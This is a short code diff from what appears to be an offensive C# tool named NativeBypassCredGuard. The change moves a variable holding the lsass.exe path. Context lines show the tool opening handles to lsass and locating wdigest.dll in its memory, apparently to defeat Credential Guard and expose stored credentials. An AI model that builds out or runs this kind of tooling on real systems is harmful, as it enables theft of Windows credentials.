@@ -403,6 +403,7 @@ namespace NativeBypassCredGuard {
         {
             string dllName = "wdigest.dll";
             string filePath = @"\??\C:\Windows\System32\" + dllName;
+            string proc_name = "c:\\windows\\system32\\lsass.exe";
             IntPtr fileHandle = IntPtr.Zero;
 
             try
@@ -432,7 +433,6 @@ namespace NativeBypassCredGuard {
                 }
 
                 // NtGetNextProcess + NtQueryInformationProcess -> Get lsass process handle 
-                string proc_name = "c:\\windows\\system32\\lsass.exe";
                 IntPtr lsassHandle = GetProcessByName(proc_name);
 
                 // NtQueryInformationProcess -> wdigest.dll address in lsass
